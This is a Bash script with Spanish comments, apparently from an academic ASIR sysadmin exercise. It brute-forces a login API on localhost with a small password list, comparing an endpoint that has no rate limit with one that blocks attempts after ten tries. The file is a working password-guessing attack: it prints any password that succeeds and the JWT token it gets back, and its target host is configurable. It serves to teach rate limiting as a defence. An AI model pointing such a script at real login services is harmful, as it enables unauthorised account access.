#!/bin/bash
# ============================================================
#  SOFIA SOLUTIONS — Ataque de Fuerza Bruta (Académico ASIR)
#  Uso: bash sofia-bruteforce.sh [email] [vulnerable|secure]
#  Endpoints:
#    Vulnerable → POST /api/v1/auth/login  (sin rate-limit)
#    Seguro     → POST /api/v2/auth/login  (rate-limit 10/15min)
# ============================================================

API_BASE="${API_BASE:-http://localhost:8001}"
URL_VULN="$API_BASE/api/v1/auth/login"
URL_SAFE="$API_BASE/api/v2/auth/login"
TARGET_EMAIL="${1:-aquila@sofia.local}"
MODE="${2:-vulnerable}"
WORDLIST=("password123" "admin" "1234" "SofiaAdmin" "qwerty" "letmein" "S0f1a_Secur3!_2026")

# ---- Verificar que el servidor está disponible ----
echo "============================================="
echo "  SOFIA SOLUTIONS — Fuerza Bruta (ASIR)"
echo "============================================="
echo "[*] Verificando conectividad con $API_BASE..."
HTTP_CHECK=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$API_BASE/health" 2>/dev/null)
if [ "$HTTP_CHECK" != "200" ]; then
    echo "[✗] No se puede conectar con la API en $API_BASE"
    echo "    Asegúrate de que el backend está corriendo: docker ps"
    exit 1
fi
echo "[✓] API disponible — HTTP $HTTP_CHECK"
echo ""
echo "[*] Objetivo: $TARGET_EMAIL"
echo "[*] Probando ${#WORDLIST[@]} contraseñas..."
echo ""

if [ "$MODE" = "secure" ]; then
    echo "[!] MODO SEGURO — Rate Limiter bloqueará tras 10 intentos (15 min)"
    echo ""
    for PWD in "${WORDLIST[@]}"; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X POST "$URL_SAFE" \
            -H "Content-Type: application/json" \
            -H "Origin: http://localhost:8000" \
            -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$PWD\"}")

        if [ "$RESPONSE" = "429" ]; then
            echo "[BLOQUEADO] Rate Limit activado — HTTP 429 Too Many Requests"
            echo "[✓] El servidor seguro rechazó el ataque correctamente."
            break
        elif [ "$RESPONSE" = "200" ]; then
            echo "[!!!] Acceso concedido con contraseña: $PWD"
        elif [ "$RESPONSE" = "403" ]; then
            echo "[BLOQUEADO] CSRF/Captcha requerido — HTTP 403"
            break
        else
            echo "[ ] Fallo [$RESPONSE]: $PWD"
        fi
        sleep 0.3
    done
else
    echo "[!] MODO VULNERABLE — Sin Rate Limiting, todas las peticiones pasan"
    echo ""
    SUCCESS=false
    for PWD in "${WORDLIST[@]}"; do
        BODY=$(curl -s --max-time 5 -X POST "$URL_VULN" \
            -H "Content-Type: application/json" \
            -H "Origin: http://localhost:8000" \
            -d "{\"email\":\"$TARGET_EMAIL\",\"password\":\"$PWD\"}")
        STATUS=$(echo "$BODY" | grep -o '"accessToken"' | wc -l | tr -d ' ')

        if [ "$STATUS" -gt 0 ]; then
            TOKEN=$(echo "$BODY" | grep -oP '"accessToken":"\K[^"]+' 2>/dev/null || echo "N/A")
            echo "[+++] ÉXITO — Contraseña encontrada: $PWD"
            echo "[+++] Token JWT: ${TOKEN:0:50}..."
            SUCCESS=true
            break
        else
            echo "[ ] Fallo: $PWD"
        fi
        sleep 0.1
    done
    if [ "$SUCCESS" = false ]; then
        echo ""
        echo "[-] Ninguna contraseña del diccionario coincide."
    fi
fi

echo ""
echo "============================================="
echo "  FIN DEL ATAQUE DE FUERZA BRUTA"
echo "============================================="
